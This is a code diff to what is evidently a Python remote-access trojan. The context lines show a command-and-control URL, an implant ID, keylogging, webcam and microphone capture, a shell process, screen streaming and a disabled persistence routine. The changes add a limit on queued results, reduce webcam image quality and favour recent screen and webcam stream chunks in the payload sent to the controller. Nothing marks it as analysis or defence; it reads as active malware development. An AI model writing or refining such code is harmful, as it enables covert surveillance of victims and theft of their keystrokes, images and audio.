@@ -41,6 +41,7 @@ screen_stream_thread = None
 shell_process = None
 shell_output_queue = queue.Queue()
 MAX_CHUNK_SIZE = 1024 * 1024 
+MAX_PENDING_RESULTS = 25 
 
 
 
@@ -143,7 +144,7 @@ def capture_webcam():
     cap.release()
     if not ret:
         raise Exception("Webcam failed")
-    _, buf = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), 70])
+    _, buf = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), 50])
     return buf.tobytes()
 
 def record_mic(seconds=10):
@@ -256,10 +257,11 @@ def chunk_large_output(tag: str, data: bytes):
     return chunks
 
 def main():
+
     #establish_persistence()
     if "keylog" in sys.argv:  # optional: start keylogger early
         start_keylogger()
-    global c2_url, c2_fetch_backoff, pending_results
+    global c2_url, c2_fetch_backoff, pending_results, MAX_PENDING_RESULTS
     
     while True:
         if not c2_url:
@@ -279,6 +281,13 @@ def main():
         if logs:
             with results_lock:
                 pending_results.append({"task_id": "keylog_periodic", "output": logs})
+        
+        with results_lock:
+            if len(pending_results) > MAX_PENDING_RESULTS:
+                # Prioritize streams/live data
+                stream_results = [r for r in pending_results if r["output"].startswith(("SCREEN_STREAM_CHUNK:", "WEBCAM_STREAM_CHUNK:"))]
+                other_results = [r for r in pending_results if not r["output"].startswith(("SCREEN_STREAM_CHUNK:", "WEBCAM_STREAM_CHUNK:"))]
+                pending_results = stream_results[-15:] + other_results[-10:]  # Favor recent stream frames
 
         payload = {
             "id": implant_id,
